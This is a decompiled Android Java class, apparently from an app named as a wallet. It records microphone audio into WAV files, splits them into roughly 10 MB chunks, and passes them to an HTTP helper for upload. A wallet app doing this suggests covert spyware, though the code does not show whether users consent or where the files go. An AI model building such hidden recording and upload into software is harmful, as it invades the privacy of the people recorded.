package p007j;

import a1.AbstractC0026q;
import android.media.AudioRecord;
import android.media.audiofx.AutomaticGainControl;
import android.media.audiofx.NoiseSuppressor;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.utils.AbstractC0251g;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;

/* renamed from: j.b */
/* loaded from: classes.dex */
public final class C0347b extends Thread {

    /* renamed from: a */
    public final AudioRecord f665a;

    /* renamed from: b */
    public final int f666b;

    /* renamed from: c */
    public boolean f667c = false;

    /* renamed from: d */
    public final /* synthetic */ C0349d f668d;

    public C0347b(C0349d c0349d, int i2) {
        String str;
        NoiseSuppressor create;
        this.f668d = c0349d;
        this.f666b = 10240;
        int i3 = (i2 < 0 || i2 > 10) ? 1 : i2;
        int minBufferSize = AudioRecord.getMinBufferSize(44100, 12, 2) * 1;
        this.f666b = minBufferSize;
        Log.d("AudioRecordManager", "record buffer size = " + minBufferSize);
        if (AbstractC0251g.m653Z() == null || ContextCompat.checkSelfPermission(AbstractC0251g.m653Z(), "android.permission.RECORD_AUDIO") != 0) {
            return;
        }
        AudioRecord audioRecord = new AudioRecord(i3, 44100, 12, 2, minBufferSize);
        this.f665a = audioRecord;
        if (AutomaticGainControl.isAvailable()) {
            AutomaticGainControl create2 = AutomaticGainControl.create(audioRecord.getAudioSessionId());
            if (create2 != null) {
                create2.setEnabled(true);
                if (NoiseSuppressor.isAvailable() || (create = NoiseSuppressor.create(audioRecord.getAudioSessionId())) == null) {
                    Log.w("AudioRecordManager", "AudioRecordThread: 不支持噪声抑制");
                } else {
                    create.setEnabled(true);
                    return;
                }
            }
            str = "AutomaticGainControl is NULL. 无法开启自动增益";
        } else {
            str = "AudioRecordThread: 不支持自动增益AutomaticGainControl";
        }
        Log.w("AudioRecordManager", str);
        if (NoiseSuppressor.isAvailable()) {
        }
        Log.w("AudioRecordManager", "AudioRecordThread: 不支持噪声抑制");
    }

    /* renamed from: a */
    public final void m878a(boolean z2) {
        try {
            this.f668d.f681e.close();
            this.f668d.f682f.close();
            RandomAccessFile randomAccessFile = new RandomAccessFile(this.f668d.f680d, "rw");
            C0349d c0349d = this.f668d;
            byte[] m880a = C0349d.m880a(c0349d, c0349d.f679c.length() - 44, this.f665a.getChannelCount());
            StringBuilder sb = new StringBuilder();
            sb.append("header: ");
            StringBuilder sb2 = new StringBuilder();
            for (int i2 = 0; i2 < 44; i2++) {
                sb2.append(Integer.toHexString(m880a[i2]));
                sb2.append(",");
            }
            sb.append(sb2.toString());
            Log.d("AudioRecordManager", sb.toString());
            randomAccessFile.seek(0L);
            randomAccessFile.write(m880a);
            randomAccessFile.close();
            Log.d("AudioRecordManager", "tmpWavFile.length: " + this.f668d.f680d.length());
            C0349d c0349d2 = this.f668d;
            c0349d2.f684h.add(c0349d2.f680d);
            if (!z2 || this.f668d.f684h.size() >= 2) {
                C0349d c0349d3 = this.f668d;
                c0349d3.m882c(c0349d3.f678b, "正在上传".concat(String.valueOf(this.f668d.f684h.size())).concat("个录音文件"));
                AbstractC0207l.m413A(this.f668d.f684h);
                this.f668d.f684h.clear();
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("AudioRecordManager", e2);
        }
    }

    /* renamed from: b */
    public final boolean m879b() {
        try {
            this.f668d.f679c = File.createTempFile("recording", ".pcm", new File(C0349d.f674m));
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyMMdd_HHmmss", Locale.CHINA);
            this.f668d.f680d = new File(C0349d.f675n + File.separator + "r" + simpleDateFormat.format(new Date()) + ".wav");
            StringBuilder sb = new StringBuilder("tmp file ");
            sb.append(this.f668d.f679c.getName());
            Log.d("AudioRecordManager", sb.toString());
            this.f668d.f681e = new FileOutputStream(this.f668d.f679c);
            this.f668d.f682f = new FileOutputStream(this.f668d.f680d);
            this.f668d.f682f.write(new byte[44]);
            C0349d c0349d = this.f668d;
            c0349d.f683g = 0;
            c0349d.m882c(c0349d.f678b, "已生成录音文件:".concat(this.f668d.f680d.getName()));
            return true;
        } catch (IOException e2) {
            AbstractC0026q.m186s("AudioRecordManager", e2);
            C0349d c0349d2 = this.f668d;
            c0349d2.m882c(c0349d2.f678b, "生成录音文件失败:".concat(!AbstractC0026q.m151B(e2.getMessage()) ? e2.getMessage() : e2.getCause() != null ? e2.getCause().toString() : Arrays.toString(e2.getStackTrace())));
            return false;
        }
    }

    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        boolean m879b = m879b();
        this.f667c = m879b;
        if (this.f665a == null || !m879b) {
            return;
        }
        C0349d c0349d = this.f668d;
        EnumC0348c enumC0348c = EnumC0348c.RECORDING;
        c0349d.f678b = enumC0348c;
        C0349d c0349d2 = this.f668d;
        c0349d2.m882c(c0349d2.f678b, AbstractC0026q.m157H());
        Log.d("AudioRecordManager", "录制开始");
        try {
            this.f665a.startRecording();
            int i2 = this.f666b;
            byte[] bArr = new byte[i2];
            while (this.f668d.f678b.equals(enumC0348c) && this.f667c && this.f668d.f687k - System.currentTimeMillis() > 0 && !isInterrupted()) {
                int read = this.f665a.read(bArr, 0, i2);
                this.f668d.f681e.write(bArr, 0, read);
                this.f668d.f681e.flush();
                this.f668d.f682f.write(bArr, 0, read);
                this.f668d.f682f.flush();
                C0349d c0349d3 = this.f668d;
                int i3 = c0349d3.f683g + read;
                c0349d3.f683g = i3;
                if (i3 > 10485760) {
                    m878a(true);
                    this.f667c = m879b();
                }
            }
            this.f665a.stop();
            m878a(false);
            Log.i("AudioRecordManager", "audio tmp PCM file len: " + this.f668d.f679c.length());
        } catch (Exception e2) {
            AbstractC0026q.m186s("AudioRecordManager", e2);
            this.f668d.m882c(EnumC0348c.ERROR, AbstractC0026q.m157H());
        }
        C0349d c0349d4 = this.f668d;
        c0349d4.m882c(c0349d4.f678b, AbstractC0026q.m157H());
        this.f668d.f678b = EnumC0348c.IDLE;
        C0349d c0349d5 = this.f668d;
        c0349d5.m882c(c0349d5.f678b, AbstractC0026q.m157H());
        Log.d("AudioRecordManager", "录音结束");
    }
}
